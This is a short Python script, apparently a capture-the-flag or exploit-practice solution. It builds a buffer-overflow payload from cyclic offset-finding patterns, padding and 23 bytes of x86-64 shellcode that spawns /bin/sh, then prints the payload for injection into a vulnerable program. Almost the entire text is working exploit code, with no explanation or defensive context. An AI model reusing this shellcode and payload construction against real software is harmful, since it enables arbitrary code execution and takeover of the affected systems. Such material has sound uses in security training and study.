# 152
before = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
# 88
afterr = "aaaabaaacaa     eaaafaaagaa     iaaajaaakaa     maaanaaaoaa     qaaaraaasaa     uaaavaaawaa     yaaazaabbaa     daabeaabfaa"

# 23
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload = 'a' * (152 - 29) + shellcode + 'a' * (29 - 23)
print(payload)
